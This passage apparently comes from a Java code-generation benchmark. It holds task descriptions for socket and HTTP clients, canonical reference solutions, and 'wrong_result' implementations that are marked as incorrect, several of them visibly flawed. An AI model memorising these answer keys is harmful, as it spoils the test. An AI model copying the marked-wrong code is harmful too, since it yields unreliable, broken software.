    "wrong_result": "import java.io.*;\nimport java.net.Socket;\nimport java.util.List;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\n\npublic class ServiceClient {\n    public void connectToService(EurekaClient eurekaClient) {\n        List<InstanceInfo> instances = eurekaClient.getInstancesByVipAddress(\"sampleservice.mydomain.net\", false);\n        if (instances == null || instances.isEmpty()) {\n            System.err.println(\"No instances found for service sampleservice.mydomain.net\");\n            return;\n        }\n        InstanceInfo instance = instances.get(0);\n        String host = instance.getIPAddr();\n        int port = instance.getPort();\n        try (Socket socket = new Socket(host, port)) {\n            String request = \"request: \" + System.currentTimeMillis();\n            try (OutputStream out = socket.getOutputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n                out.write(request.getBytes());\n                out.flush();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            }\n        } catch (IOException e) {\n            System.err.println(\"Connection error: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 575,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP client connection to a server, sends a command, and retrieves the server's response using socket programming.\n\nClass Description: The FourLetterCommand class provides functionality to connect to a server, send a command string, and receive the server's response. It handles socket creation, connection, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n\nMethods:\n- FourLetterCommand(String host, int port) -> None - Constructor that initializes the host and port attributes\n- request(String command) -> String - Establishes a connection to the server, sends the command, and returns the server's response\n- response(Socket client) -> String - Reads the server's response from the socket input stream and returns it as a string\n- cleanup(Closeable c) -> void - Closes the provided Closeable resource (socket or stream) and handles any IOExceptions silently",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class FourLetterCommand {\n\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        final Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(command.getBytes());\n            outputStream.flush();\n            return response(socket);\n        } catch (IOException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private String response(Socket client) {\n        try {\n            var reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            var builder = new StringBuilder(\"\");\n            String str;\n            while ((str = reader.readLine()) != null) {\n                builder.append(str).append(\"\\n\");\n            }\n            cleanup(client);\n            return builder.toString();\n        } catch (Exception e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private void cleanup(Closeable c) {\n        if (c != null) {\n            try {\n                c.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class FourLetterCommand {\n    private final String host;\n    private final int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        Socket socket = null;\n        try {\n            socket = new Socket(host, port);\n            try (OutputStream out = socket.getOutputStream()) {\n                out.write(command.getBytes());\n                out.flush();\n            }\n            return response(socket);\n        } catch (IOException e) {\n            return \"\";\n        } finally {\n            if (socket != null) {\n                cleanup(socket);\n            }\n        }\n    }\n\n    public String response(Socket client) {\n        try {\n            try (InputStream in = client.getInputStream()) {\n                StringBuilder sb = new StringBuilder();\n                int ch;\n                while ((ch = in.read()) != -1) {\n                    sb.append((char) ch);\n                }\n                return sb.toString();\n            }\n        } catch (IOException e) {\n            return \"\";\n        }\n    }\n\n    public void cleanup(Closeable c) {\n        try {\n            if (c != null) {\n                c.close();\n            }\n        } catch (IOException e) {\n            // Handle silently\n        }\n    }\n}"
  },
  {
    "Task_id": 577,
    "Instruction": "Task Description: Implement a MySQL client channel class in Java that handles TCP socket communication with a MySQL server, including connection management, query execution, and packet handling.\n\nClass Description: MySQLChannel is a final class that provides a TCP-based communication channel to interact with a MySQL server. It manages socket connections, executes SQL queries, and handles MySQL protocol packets. The class includes connection configuration, buffer management, and proper resource cleanup.\n\nAttributes:\n- dsc: [DataSourceConfig] - Configuration object containing host, port and other connection parameters\n- socket: [Socket] - TCP socket connection to the MySQL server\n- in: [InputStream] - Buffered input stream for reading server responses\n- out: [OutputStream] - Buffered output stream for sending commands to server\n- isClosed: [AtomicBoolean] - Thread-safe flag indicating whether the channel is closed\n\nMethods:\n- connect(long timeout) -> [void] - Establishes a TCP connection to the MySQL server with specified timeout and configures socket parameters\n- execute(String statement) -> [BinaryPacket] - Executes a SQL query statement and returns the server response as a binary packet\n- receive() -> [BinaryPacket] - Reads and returns a binary packet from the server\n- close() -> [void] - Closes the connection by sending a QUIT command and releasing resources\n- BinaryPacket: [static class] - Represents a MySQL binary packet with data and packet ID\n- CommandPacket: [static class] - Represents a MySQL command packet with packet ID, command type, and arguments\n- MySQLPacket: [static class] - Contains MySQL protocol constants\n- QuitPacket: [static class] - Contains the QUIT command packet data",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic final class MySQLChannel {\n\n    private final DataSourceConfig dsc;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private final AtomicBoolean isClosed;\n\n    public MySQLChannel(DataSourceConfig dsc) {\n        this.dsc = dsc;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(long timeout) throws Exception {\n        socket = new Socket();\n        socket.setTcpNoDelay(true);\n        socket.setTrafficClass(0x04 | 0x10);\n        socket.setPerformancePreferences(0, 2, 1);\n        socket.setReceiveBufferSize(16 * 1024);\n        socket.setSendBufferSize(8 * 1024);\n        socket.connect(new InetSocketAddress(dsc.getHost(), dsc.getPort()), 10 * 1000);\n\n        in = new BufferedInputStream(socket.getInputStream(), 16 * 1024);\n        out = new BufferedOutputStream(socket.getOutputStream(), 8 * 1024);\n    }\n\n    public BinaryPacket execute(String statement) throws IOException {\n        CommandPacket packet = new CommandPacket();\n        packet.packetId = 0;\n        packet.command = MySQLPacket.COM_QUERY;\n        packet.arg = statement.getBytes();\n\n        packet.write(out);\n        out.flush();\n        return receive();\n    }\n\n    public BinaryPacket receive() throws IOException {\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        return bin;\n    }\n\n    @Override\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (out != null) {\n                    out.write(QuitPacket.QUIT);\n                    out.flush();\n                }\n            } catch (IOException e) {\n                // Log error if needed\n            } finally {\n                try {\n                    socket.close();\n                } catch (Throwable e) {\n                    // Log error if needed\n                }\n            }\n        }\n    }\n\n    private static class BinaryPacket {\n        public byte[] data;\n        public int packetId;\n\n        public void read(InputStream in) throws IOException {\n            // Implementation of packet reading\n        }\n    }\n\n    private static class CommandPacket {\n        public int packetId;\n        public byte command;\n        public byte[] arg;\n\n        public void write(OutputStream out) throws IOException {\n            // Implementation of packet writing\n        }\n    }\n\n    private static class MySQLPacket {\n        public static final byte COM_QUERY = 0x03;\n    }\n\n    private static class QuitPacket {\n        public static final byte[] QUIT = new byte[]{0x01, 0x00, 0x00, 0x00, 0x01};\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public final class MySQLChannel {\n    private final DataSourceConfig dsc;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private final AtomicBoolean isClosed;\n    private final AtomicInteger packetId;\n\n    public MySQLChannel(DataSourceConfig dsc) {\n        this.dsc = dsc;\n        this.isClosed = new AtomicBoolean(false);\n        this.packetId = new AtomicInteger(0);\n    }\n\n    public void connect(long timeout) throws IOException {\n        socket = new Socket(dsc.getHost(), dsc.getPort());\n        socket.setSoTimeout((int) timeout);\n        socket.setKeepAlive(true);\n        socket.setReuseAddress(true);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = new BufferedOutputStream(socket.getOutputStream());\n    }\n\n    public BinaryPacket execute(String statement) throws IOException {\n        if (isClosed.get()) throw new IllegalStateException(\"Channel is closed\");\n        CommandPacket cmd = new CommandPacket(packetId.getAndIncrement(), MySQLPacket.COM_QUERY, statement.getBytes(StandardCharsets.UTF_8));\n        sendPacket(cmd);\n        return receive();\n    }\n\n    public BinaryPacket receive() throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead = in.read(buffer);\n        if (bytesRead == -1) throw new IOException(\"Connection closed\");\n        \n        int packetId = buffer[0] & 0xFF;\n        int length = 0;\n        int offset = 1;\n        \n        while (offset < bytesRead) {\n            byte b = buffer[offset++];\n            length = (length << 8) | (b & 0xFF);\n            if ((b & 0x80) == 0) break;\n        }\n        \n        if (offset > bytesRead) throw new IOException(\"Incomplete packet\");\n        int dataLength = length;\n        \n        if (dataLength > bytesRead - offset) throw new IOException(\"Incomplete packet\");\n        \n        byte[] data = Arrays.copyOfRange(buffer, offset, offset + dataLength);\n        return new BinaryPacket(packetId, data);\n    }\n\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                CommandPacket quit = new CommandPacket(packetId.getAndIncrement(), MySQLPacket.COM_QUIT, new byte[0]);\n                sendPacket(quit);\n                socket.close();\n                in.close();\n                out.close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    private void sendPacket(CommandPacket packet) throws IOException {\n        int packetId = this.packetId.getAndIncrement();\n        byte[] data = new byte[1 + packet.arguments.length];\n        data[0] = (byte) packet.command;\n        System.arraycopy(packet.arguments, 0, data, 1, packet.arguments.length);\n        \n        byte[] lengthBytes = encodeLength(data.length);\n        byte[] fullPacket = new byte[lengthBytes.length + 1 + data.length];\n        fullPacket[0] = (byte) packetId;\n        System.arraycopy(lengthBytes, 0, fullPacket, 1, lengthBytes.length);\n        System.arraycopy(data, 0, fullPacket, 1 + lengthBytes.length, data.length);\n        \n        out.write(fullPacket);\n        out.flush();\n    }\n\n    private static byte[] encodeLength(int length) {\n        byte[] buffer = new byte[4];\n        int index = 0;\n        do {\n            buffer[index++] = (byte) (length & 0xFF);\n            length >>>= 8;\n        } while (length > 0);\n        if (index > 1) buffer[0] |= 0x80;\n        byte[] result = new byte[index];\n        System.arraycopy(buffer, 0, result, 0, index);\n        return result;\n    }\n\n    public static class BinaryPacket {\n        public final int packetId;\n        public final byte[] data;\n\n        public BinaryPacket(int packetId, byte[] data) {\n            this.packetId = packetId;\n            this.data = data;\n        }\n    }\n\n    public static class CommandPacket {\n        public final int packetId;\n        public final int command;\n        public final byte[] arguments;\n\n        public CommandPacket(int packetId, int command, byte[] arguments) {\n            this.packetId = packetId;\n            this.command = command;\n            this.arguments = arguments;\n        }\n    }\n\n    public static class MySQLPacket {\n        public static final int COM_QUERY = 3;\n        public static final int COM_QUIT = 1;\n    }\n\n    public static class QuitPacket {\n        public static final byte[] DATA = new byte[0];\n        public static final int COMMAND = MySQLPacket.COM_QUIT;\n    }\n}"
  },
  {
    "Task_id": 578,
    "Instruction": "Task Description: Implement a Java class for sending HTTP requests and receiving responses using socket communication.\n\nClass Description: The HTTPRequest class extends HTTPPacket and provides functionality to send HTTP POST requests to a specified server. It handles connection management, request formatting, and response processing, with support for keep-alive connections and chunked transfer encoding.\n\nAttributes:\npostSocket: Socket - The socket used for communication with the server\n\nMethods:\npost: [Name](host: String, port: int, isKeepAlive: boolean) -> HTTPResponse - Sends an HTTP POST request to the specified host and port, with optional keep-alive connection\npost: [Name](host: String, port: int) -> HTTPResponse - Sends an HTTP POST request to the specified host and port with connection closing by default (calls the 3-parameter version with isKeepAlive=false)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.InetSocketAddress;\n\npublic class HTTPRequest extends HTTPPacket {\n\n    private Socket postSocket = null;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) {\n        HTTPResponse httpRes = new HTTPResponse();\n        setHost(host);\n        setConnection((isKeepAlive == true) ? HTTP.KEEP_ALIVE : HTTP.CLOSE);\n        boolean isHeaderRequest = isHeadRequest();\n        \n        OutputStream out = null;\n        InputStream in = null;\n        \n        try {\n            if (postSocket == null){\n                postSocket = new Socket();\n                postSocket.connect(new InetSocketAddress(host, port), HTTPServer.DEFAULT_TIMEOUT);\n            }\n\n            out = postSocket.getOutputStream();\n            PrintStream pout = new PrintStream(out);\n\n            String httpPacket = \"\";\n            httpPacket += getHeader();\n            httpPacket += HTTP.CRLF;\n            \n            boolean isChunkedRequest = isChunked();\n            String content = getContentString();\n            int contentLength = 0;\n            if (content != null)\n                contentLength = content.length();\n            \n            if (0 < contentLength) {\n                if (isChunkedRequest == true) {\n                    String chunSizeBuf = Long.toHexString(contentLength);\n                    httpPacket += chunSizeBuf;\n                    httpPacket += HTTP.CRLF;\n                }\n                httpPacket += content;\n                if (isChunkedRequest == true) {\n                    httpPacket += HTTP.CRLF;\n                }\n            }\n\n            if (isChunkedRequest == true) {\n                httpPacket += \"0\";\n                httpPacket += HTTP.CRLF;\n            }\n\n            pout.print(httpPacket);\n            pout.flush();\n\n            in = postSocket.getInputStream();\n            httpRes.set(in, isHeaderRequest);        \n        } catch (SocketException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } catch (IOException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } finally {\n            if (isKeepAlive == false) {    \n                try {\n                    if (in != null) in.close();\n                } catch (Exception e) {};\n                try {\n                    if (out != null) out.close();\n                } catch (Exception e) {};\n                try {\n                    if (postSocket != null) postSocket.close();\n                } catch (Exception e) {};\n                postSocket = null;\n            }\n        }\n        \n        return httpRes;\n    }\n\n    public HTTPResponse post(String host, int port) {\n        return post(host, port, false);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class HTTPRequest extends HTTPPacket {\n    private Socket postSocket;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) throws IOException {\n        postSocket = new Socket(host, port);\n        postSocket.setKeepAlive(isKeepAlive);\n        OutputStream out = postSocket.getOutputStream();\n        String request = \"POST / HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n        out.write(request.getBytes());\n        out.flush();\n        InputStream in = postSocket.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line).append(\"\\n\");\n        }\n        HTTPResponse httpResponse = new HTTPResponse(response.toString());\n        if (!isKeepAlive) {\n            postSocket.close();\n        }\n        return httpResponse;\n    }\n\n    public HTTPResponse post(String host, int port) throws IOException {\n        return post(host, port, false);\n    }\n}"
  },
  {
    "Task_id": 579,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The TCPClient class provides functionality for establishing and managing a TCP connection with a server. It handles connection establishment, message sending/receiving, and resource cleanup.\n\nAttributes:\n- mClientSocket: [Socket] - The socket object representing the connection to the server\n- mPrintWriter: [PrintWriter] - Output stream for sending data to the server\n- mBufferedReader: [BufferedReader] - Input stream for receiving data from the server\n\nMethods:\n- connectTCPServer(): [void] - Establishes a persistent connection to the TCP server at \"localhost:8688\" and continuously listens for incoming messages\n- sendMessage(String msg): [void] - Sends a message to the connected server (Input: msg - the message string to send)\n- closeConnection(): [void] - Properly closes all network resources and connections",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class TCPClient {\n\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        Socket socket = null;\n        while (socket == null) {\n            try {\n                socket = new Socket(\"localhost\", 8688);\n                mClientSocket = socket;\n                mPrintWriter = new PrintWriter(new BufferedWriter(\n                        new OutputStreamWriter(socket.getOutputStream())), true);\n                System.out.println(\"connect server success\");\n            } catch (IOException e) {\n                System.out.println(\"connect tcp server failed, retry...\");\n            }\n        }\n\n        try {\n            mBufferedReader = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream()));\n            while (true) {\n                String msg = mBufferedReader.readLine();\n                System.out.println(\"receive :\" + msg);\n                if (msg != null) {\n                    System.out.println(\"server:\" + msg);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        if (!msg.isEmpty() && mPrintWriter != null) {\n            mPrintWriter.println(msg);\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (mClientSocket != null) {\n                mClientSocket.shutdownInput();\n                mClientSocket.close();\n            }\n            if (mPrintWriter != null) {\n                mPrintWriter.close();\n            }\n            if (mBufferedReader != null) {\n                mBufferedReader.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.io.*;\nimport java.net.*;\n\npublic class TCPClient {\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        try {\n            mClientSocket = new Socket(\"localhost\", 8688);\n            mPrintWriter = new PrintWriter(mClientSocket.getOutputStream(), true);\n            mBufferedReader = new BufferedReader(new InputStreamReader(mClientSocket.getInputStream()));\n            String response;\n            while ((response = mBufferedReader.readLine()) != null) {\n                System.out.println(\"Received: \" + response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        mPrintWriter.println(msg);\n    }\n\n    public void closeConnection() {\n        try {\n            if (mBufferedReader != null) mBufferedReader.close();\n            if (mPrintWriter != null) mPrintWriter.close();\n            if (mClientSocket != null) mClientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using HttpURLConnection for making network requests, with support for request configuration, response handling, and optional GZIP compression.\n\nClass Description: Networker is a singleton class that manages HTTP requests and responses. It uses a thread pool for asynchronous request execution and provides methods for configuring requests, handling responses, and managing connection settings.\n\nAttributes:\n\nsInstance: Networker - Singleton instance of the Networker class\nsExecutor: Executor - Thread pool executor for handling requests asynchronously\nREAD_TIMEOUT_MS: int - Timeout for reading from connection (10000ms)\nCONNECT_TIMEOUT_MS: int - Timeout for establishing connection (15000ms)\nHEADER_ACCEPT_ENCODING: String - Header key for accept encoding (\"Accept-Encoding\")\nGZIP_ENCODING: String - Value for GZIP encoding (\"gzip\")\n\nMethods:\n\nget(): void -> Networker - Returns the singleton instance of Networker\nsubmit(HttpRequest request, Callback callback): void - Submits an HTTP request for asynchronous execution\nHttpRequestTask(HttpRequest request, Callback callback): void - Constructor for the internal request task class\nrun(): void - Executes the HTTP request task\ndoFetch(): void -> HttpResponse - Performs the actual HTTP request and returns the response\nconfigureAndConnectRequest(): void -> HttpURLConnection - Configures and connects the HTTP request\nrequestDecompression(HttpURLConnection conn): void - Sets the Accept-Encoding header for GZIP compression\napplyDecompressionIfApplicable(HttpURLConnection conn, InputStream in): InputStream - Applies GZIP decompression if needed\ncopy(InputStream in, OutputStream out, byte[] buf): void - Copies data between streams\nHttpRequest(Builder b): void - Constructor for HTTP request object\nnewBuilder(): void -> Builder - Creates a new HttpRequest builder\nBuilder(): void - Constructor for HttpRequest builder\nfriendlyName(String friendlyName): Builder -> Builder - Sets friendly name for request\nmethod(HttpMethod method): Builder -> Builder - Sets HTTP method\nurl(String url): Builder -> Builder - Sets request URL\nbody(byte[] body): Builder -> Builder - Sets request body\nbuild(): void -> HttpRequest - Builds the HttpRequest object\nHttpResponse(int statusCode, byte[] body): void - Constructor for HTTP response object\nonResponse(HttpResponse result): void - Callback for successful response\nonFailure(IOException e): void - Callback for failed request",
    "Canonical_solution": "import com.facebook.stetho.urlconnection.ByteArrayRequestEntity;\nimport com.facebook.stetho.urlconnection.SimpleRequestEntity;\nimport com.facebook.stetho.urlconnection.StethoURLConnectionManager;\nimport javax.annotation.Nullable;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\nimport java.util.zip.GZIPInputStream;\n\npublic class Networker {\n  private static Networker sInstance;\n  private final Executor sExecutor = Executors.newFixedThreadPool(4);\n  private static final int READ_TIMEOUT_MS = 10000;\n  private static final int CONNECT_TIMEOUT_MS = 15000;\n  private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n  private static final String GZIP_ENCODING = \"gzip\";\n\n  public static synchronized Networker get() {\n    if (sInstance == null) {\n      sInstance = new Networker();\n    }\n    return sInstance;\n  }\n\n  private Networker() {\n  }\n\n  public void submit(HttpRequest request, Callback callback) {\n    sExecutor.execute(new HttpRequestTask(request, callback));\n  }\n\n  private class HttpRequestTask implements Runnable {\n    private final HttpRequest request;\n    private final Callback callback;\n    private final StethoURLConnectionManager stethoManager;\n\n    public HttpRequestTask(HttpRequest request, Callback callback) {\n      this.request = request;\n      this.callback = callback;\n      stethoManager = new StethoURLConnectionManager(request.friendlyName);\n    }\n\n    @Override\n    public void run() {\n      try {\n        HttpResponse response = doFetch();\n        callback.onResponse(response);\n      } catch (IOException e) {\n        callback.onFailure(e);\n      }\n    }\n\n    private HttpResponse doFetch() throws IOException {\n      HttpURLConnection conn = configureAndConnectRequest();\n      try {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        InputStream rawStream = conn.getInputStream();\n        try {\n          rawStream = stethoManager.interpretResponseStream(rawStream);\n          InputStream decompressedStream = applyDecompressionIfApplicable(conn, rawStream);\n          if (decompressedStream != null) {\n            copy(decompressedStream, out, new byte[1024]);\n          }\n        } finally {\n          if (rawStream != null) {\n            rawStream.close();\n          }\n        }\n        return new HttpResponse(conn.getResponseCode(), out.toByteArray());\n      } finally {\n        conn.disconnect();\n      }\n    }\n\n    private HttpURLConnection configureAndConnectRequest() throws IOException {\n      URL url = new URL(request.url);\n      HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n      try {\n        conn.setReadTimeout(READ_TIMEOUT_MS);\n        conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n        conn.setRequestMethod(request.method.toString());\n        requestDecompression(conn);\n\n        SimpleRequestEntity requestEntity = null;\n        if (request.body != null) {\n          requestEntity = new ByteArrayRequestEntity(request.body);\n        }\n\n        stethoManager.preConnect(conn, requestEntity);\n        try {\n          if (request.method == HttpMethod.POST) {\n            if (requestEntity == null) {\n              throw new IllegalStateException(\"POST requires an entity\");\n            }\n            conn.setDoOutput(true);\n            requestEntity.writeTo(conn.getOutputStream());\n          }\n\n          conn.connect();\n          stethoManager.postConnect();\n          return conn;\n        } catch (IOException inner) {\n          stethoManager.httpExchangeFailed(inner);\n          throw inner;\n        }\n      } catch (IOException outer) {\n        conn.disconnect();\n        throw outer;\n      }\n    }\n  }\n\n  private static void requestDecompression(HttpURLConnection conn) {\n    conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n  }\n\n  @Nullable\n  private static InputStream applyDecompressionIfApplicable(\n      HttpURLConnection conn, @Nullable InputStream in) throws IOException {\n    if (in != null && GZIP_ENCODING.equals(conn.getContentEncoding())) {\n      return new GZIPInputStream(in);\n    }\n    return in;\n  }\n\n  private static void copy(InputStream in, OutputStream out, byte[] buf) throws IOException {\n    if (in == null) {\n      return;\n    }\n    int n;\n    while ((n = in.read(buf)) != -1) {\n      out.write(buf, 0, n);\n    }\n  }\n\n  public static class HttpRequest {\n    public final String friendlyName;\n    public final HttpMethod method;\n    public final String url;\n    public final byte[] body;\n\n    public static Builder newBuilder() {\n      return new Builder();\n    }\n\n    HttpRequest(Builder b) {\n      this.friendlyName = b.friendlyName;\n      this.method = b.method;\n      this.url = b.url;\n      this.body = b.body;\n    }\n\n    public static class Builder {\n      private String friendlyName;\n      private Networker.HttpMethod method;\n      private String url;\n      private byte[] body = null;\n\n      Builder() {\n      }\n\n      public Builder friendlyName(String friendlyName) {\n        this.friendlyName = friendlyName;\n        return this;\n      }\n\n      public Builder method(Networker.HttpMethod method) {\n        this.method = method;\n        return this;\n      }\n\n      public Builder url(String url) {\n        this.url = url;\n        return this;\n      }\n\n      public Builder body(byte[] body) {\n        this.body = body;\n        return this;\n      }\n\n      public HttpRequest build() {\n        return new HttpRequest(this);\n      }\n    }\n  }\n\n  public static enum HttpMethod {\n    GET, POST\n  }\n\n  public static class HttpResponse {\n    public final int statusCode;\n    public final byte[] body;\n\n    HttpResponse(int statusCode, byte[] body) {\n      this.statusCode = statusCode;\n      this.body = body;\n    }\n  }\n\n  public interface Callback {\n    public void onResponse(HttpResponse result);\n    public void onFailure(IOException e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class Networker {\n    private static final Networker sInstance = new Networker();\n    private final ExecutorService sExecutor;\n    private static final int READ_TIMEOUT_MS = 10000;\n    private static final int CONNECT_TIMEOUT_MS = 15000;\n    private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n    private static final String GZIP_ENCODING = \"gzip\";\n\n    private Networker() {\n        sExecutor = Executors.newFixedThreadPool(4);\n    }\n\n    public static Networker get() {\n        return sInstance;\n    }\n\n    public void submit(HttpRequest request, Callback callback) {\n        sExecutor.submit(new HttpRequestTask(request, callback));\n    }\n\n    private class HttpRequestTask implements Runnable {\n        private final HttpRequest request;\n        private final Callback callback;\n\n        HttpRequestTask(HttpRequest request, Callback callback) {\n            this.request = request;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                HttpResponse response = doFetch();\n                callback.onResponse(response);\n            } catch (IOException e) {\n                callback.onFailure(e);\n            }\n        }\n    }\n\n    private HttpResponse doFetch() throws IOException {\n        HttpURLConnection conn = configureAndConnectRequest();\n        requestDecompression(conn);\n        int statusCode = conn.getResponseCode();\n        InputStream in = conn.getInputStream();\n        byte[] body = applyDecompressionIfApplicable(conn, in).readAllBytes();\n        return new HttpResponse(statusCode, body);\n    }\n\n    private HttpURLConnection configureAndConnectRequest() throws IOException {\n        HttpURLConnection conn = (HttpURLConnection) new URL(request.getUrl()).openConnection();\n        conn.setRequestMethod(request.getMethod().name());\n        conn.setReadTimeout(READ_TIMEOUT_MS);\n        conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n        conn.setDoOutput(true);\n        conn.setDoInput(true);\n        conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n        conn.connect();\n        return conn;\n    }\n\n    private void requestDecompression(HttpURLConnection conn) {\n        conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n    }\n\n    private InputStream applyDecompressionIfApplicable(HttpURLConnection conn, InputStream in) throws IOException {\n        String encoding = conn.getContentEncoding();\n        if (encoding != null && encoding.contains(GZIP_ENCODING)) {\n            return new GZIPInputStream(in);\n        }\n        return in;\n    }\n\n    private void copy(InputStream in, OutputStream out, byte[] buf) throws IOException {\n        int bytesRead;\n        while ((bytesRead = in.read(buf)) != -1) {\n            out.write(buf, 0, bytesRead);\n        }\n    }\n\n    public static class HttpRequest {\n        private final String url;\n        private final String method;\n        private final byte[] body;\n\n        private HttpRequest(Builder b) {\n            this.url = b.url;\n            this.method = b.method;\n            this.body = b.body;\n        }\n\n        public String getUrl() {\n            return url;\n        }\n\n        public String getMethod() {\n            return method;\n        }\n\n        public byte[] getBody() {\n            return body;\n        }\n\n        public static Builder newBuilder() {\n            return new Builder();\n        }\n\n        public static class Builder {\n            private String url;\n            private String method;\n            private byte[] body;\n            private String friendlyName;\n\n            public Builder friendlyName(String friendlyName) {\n                this.friendlyName = friendlyName;\n                return this;\n            }\n\n            public Builder method(HttpMethod method) {\n                this.method = method.name();\n                return this;\n            }\n\n            public Builder url(String url) {\n                this.url = url;\n                return this;\n            }\n\n            public Builder body(byte[] body) {\n                this.body = body;\n                return this;\n            }\n\n            public HttpRequest build() {\n                return new HttpRequest(this);\n            }\n        }\n    }\n\n    public static class HttpResponse {\n        private final int statusCode;\n        private final byte[] body;\n\n        HttpResponse(int statusCode, byte[] body) {\n            this.statusCode = statusCode;\n            this.body = body;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public byte[] getBody() {\n            return body;\n        }\n    }\n\n    public interface Callback {\n        void onResponse(HttpResponse result);\n        void onFailure(IOException e);\n    }\n\n    public enum HttpMethod {\n        GET, POST, PUT, DELETE\n    }\n}"
  },
  {
    "Task_id": 580,
